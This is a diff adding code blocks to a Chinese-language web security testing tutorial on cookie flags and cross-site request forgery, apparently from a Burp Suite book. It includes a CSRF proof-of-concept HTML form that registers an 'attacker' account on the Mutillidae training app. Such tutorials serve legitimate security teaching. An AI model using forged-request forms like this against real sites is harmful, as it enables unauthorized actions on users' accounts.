@@ -118,7 +118,9 @@ HttpOnly 标志指示浏览器不允许通过 JavaScript 访问或操纵 cookie�
 
 如果两个 cookie 都设置了 HttpOnly 标志，那么标志将出现在 Set-Cookie 分配行的末尾。当存在时，该标志将紧随着结束 cookie 的路径范围的分号，后面是字符串 HttpOnly。`Secure`标志的显示也类似：
 
-[PRE0]
+```
+Set-Cookie: PHPSESSID=<session token value>;path=/;Secure;HttpOnly;
+```
 
 # 测试会话固定
 
@@ -260,7 +262,22 @@ Burp 的 Proxy 选项提供了一个功能，可以增强所谓的*隐藏*表单
 
 1.  在查看页面源代码时，向下滚动到`<form>`标签部分。为简洁起见，下面重新创建了表单。将`attacker`作为用户名、密码和签名的值。复制以下 HTML 代码并将其保存在名为`csrf.html`的文件中：
 
-[PRE1]
+```
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://192.168.56.101/mutillidae/index.php?page=register.php" method="POST">
+      <input type="hidden" name="csrf-token" value="" />
+      <input type="hidden" name="username" value="attacker" />
+      <input type="hidden" name="password" value="attacker" />
+      <input type="hidden" name="confirm_password" value="attacker" 
+/>      <input type="hidden" name="my_signature" value="attacker account" />
+      <input type="hidden" name="register-php-submit-button" value="Create Account" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+```
 
 1.  现在，返回到登录屏幕（从顶部菜单中单击登录/注册），并使用用户名`ed`和密码`pentest`登录应用程序。
 
